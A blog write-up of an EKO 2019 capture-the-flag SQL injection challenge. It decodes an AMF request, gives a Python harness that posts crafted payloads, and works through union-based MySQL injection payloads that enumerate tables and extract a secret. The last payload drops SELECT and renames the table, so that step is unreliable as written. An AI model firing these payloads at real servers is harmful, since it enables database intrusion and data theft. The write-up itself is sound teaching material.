---
layout: post
title: Weirdo (SQLi writeup - EKO 2019)
---

Quick writeup of a SQL injection challenge.

<!-- more -->
We start with a
[pcap](/book-of-gehn/assets/eko2019-writeups/weiro-dir/wtf.pcap)
of a HTTP communication between a client and a server.

It is only one request/response.

With ``wireshark`` we can see that the parties are talking using
[AMF](https://en.wikipedia.org/wiki/Action_Message_Format)

Here is the decoded ``POST``:

```
Hypertext Transfer Protocol
    POST / HTTP/1.1
    Content-type: application/x-amf
    Content-Length: 40
Action Message Format
    AMF version: 0
    Header count: 0
    Message count: 1
    Messages
        Target URI: EKO.CTF
        Response URI: /1
        Length: Unknown
        ECMA array (1 items)
            AMF0 type: ECMA array (0x08)
            Array length: 0
            Property 'q' String 'arg'
                Name: q
                    String length: 1
                    String: q
                String 'arg'
                    AMF0 type: String (0x02)
                    String length: 3
                    String: arg
            End Of Object Marker
```

### Brief AMF Disassemble

In particular, this is the hexdump of the AMF message:

```
0000   00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
0010   02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
0020   00 03 61 72 67 00 00 09
```

From the end to the begin, the ``00 00 09`` is the
``End of Object Marker``, ``02 00 03 61 72 67`` is the
``arg`` string, in ASCII prefixed with 2 bytes that
determines its length in big endian and all of that is
prefixed with on byte, ``02`` that says what follows is
a string.

I'm going to stop here as my understanding of AMF is quite
low and it deserves a separate post.

Playing with the value of the query, this ``arg``, is all
what we need to get some fun.

Replacing ``arg`` with ``'xx`` we get a database error showing
that the server is vulnerable to a SQL injection.

So you know what I'm talking about.


### Custom Queries

Before playing, we need a simple way to submit custom queries.

We treat the AMF message as an opaque string, the only thing
that we need is to inject an arbitrary string ``q`` prefixed
with its size.

```python
>>> from cryptonita import B

>>> hdr = '''
... 00 00 00 00 00 01 00 07 45 4b 4f 2e 43 54 46 00
... 02 2f 31 ff ff ff ff 08 00 00 00 00 00 01 71 02
... '''

>>> hdr = B(hdr, encoding=16)
>>> eom =  B('00 00 09', encoding=16)

>>> def payload(q):
...     q  = B(q)
...     sz = B(len(q))
...
...     sz = sz.pack('>H') # uint16, big endian
...     return hdr + sz + q + eom
```

We wrap this into a HTTP POST.

```python
import requests

def post(q):
    url = 'https://wtf.eko.cap.tf/'
    data = payload(q)

    r = requests.post(url, data=data)
    for chunk in r.content.split(b'network'):
        chunk = B([c for c in chunk if chr(c).isprintable()])
        print(chunk)
```

The response is also a AMF message that we treat it as a binary blob.

For this reason we arbitrary split the response in chunks and we
filter out any non-printable char.

And *voila!* With ``post`` we can submit arbitrary queries and see their
responses.

### Prologue and Epilogue

We know that we are injecting in the middle of a SQL query but
we don't know *where*.

We may be injecting here

```
select ??? from ??? where ???='<here>' ;
```

but we may be injected here:

```
select ??? from ??? where ??? in (select ??? from ??? where ???='<here>' ???);
```

The possibilities are infinite.

If we *assume* the first case, we could try this:

 - a *prologue* of ``'`` to close the left side of the query
 - a *epilogue* of ``; --`` to close the statement and ignore anything
on the right.

```
>>> q = b"'; --"
```

The idea is that we transform the *host* query

```
select ??? from ??? where ???='<here>';
```

into this:

```
select ??? from ??? where ???=''; --';
```

But we were wrong. It failed.

Perhaps we are in the wrong spot, perhaps one of our injected characters
were filtered or our prologue and/or epilogue is wrong.

The ``--`` begins a comment. Each SQL engine has its own. The ``--`` works
in Oracle and under *some* conditions in MySQL.

The ``#`` works only in MySQL without any condition so we could try that:

```python
>>> q = b"'; #"
```

```
select ??? from ??? where ???=''; #';
```

And it worked! And we learnt that the database is a MySQL for free.

[Ref](http://www.sqlinjection.net/comments/)


### Deducing the Host Query Structure

Under the hypothetical host query:

```
select ??? from ??? where ???='<here>';
```

We could learn how many *columns* is using the ``select`` making the
query to order the results by the, let's say, the 10th column.

If it fails we now that it has less than 10 columns.

After some binary search, we learn that it has 5 columns:

```python
>>> q = b"' order by 5 ;#"    # 5 columns
```

```
select c1, c2, c3, c4, c5 from ??? where ???='' order by 5 ; #';
```

We can experiment further with:

```python
>>> q = b"' union select 99, 98, 97, 96, 95 from information_schema.tables ;#"
```

```
select ??? from ??? where ???='' union select 99, 98, 97, 96, 95 from information_schema.tables ;#';
```

This also validates that the database engine is a MySQL (``information_schema``
is MySQL specific) and that we can *union* the results.

The last confirms that the host query is just a ``select`` and we are
injecting in the ``where`` clause.


### Information Gathering

With this we can learn what other tables are in the database:

```python
>>> q = b"' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#"
```

```
select ??? from ??? where ???='' and 1=0 union select 99, table_name, 97, 96, 95 from information_schema.tables ;#';
```

And with this one we can learn what columns has the table ``secret``, table that
found with the previous query and it has a interesting name.

```python
>>> q = b"' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#"
```

```
select ??? from ??? where ???='' and 1=0 union select 99, column_name, 97, 96, 95 from information_schema.columns where table_name='secret' ;#';
```

In both cases the ``and 1=0`` makes the *host* query to produce zero results
and it makes the output much cleaner.


### Profit!

Finally:

```python
>>> q = b"' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#"
>>> post(q)
<...>
EKO{ this is the flag }
<...>
```

```
select ??? from ??? where ???='' and 1=0 union 99, secret, 97, 96, 95 FROM secrets ;#';
```
